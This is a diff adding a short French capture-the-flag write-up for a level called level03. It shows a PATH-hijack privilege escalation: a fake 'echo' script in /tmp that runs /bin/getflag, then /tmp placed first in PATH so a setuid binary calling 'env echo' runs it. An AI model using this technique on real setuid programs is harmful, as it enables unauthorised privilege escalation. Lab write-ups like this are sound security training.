@@ -1,0 +1,12 @@
+Contient level03 qui s'execute avec les privileges de flag03 (rws en permissions et flag03 en user)
+
+avec ltrace ./level03, on voit que le programme utilise system(/usr/bin/env echo)
+on cree donc dans /tmp un .sh echo qui lance getflag:
+
+echo -e '#!/bin/sh\n/bin/getflag' > /tmp/echo
+chmod +x echo
+
+Puis on ajoute /tmp a $PATH pour qu'il trouve notre echo avec echo
+export PATH=/tmp:$PATH
+
+maintenant, quand on lance ./level03, celui ci execute notre echo, et donc getflag avec les privileges flag03
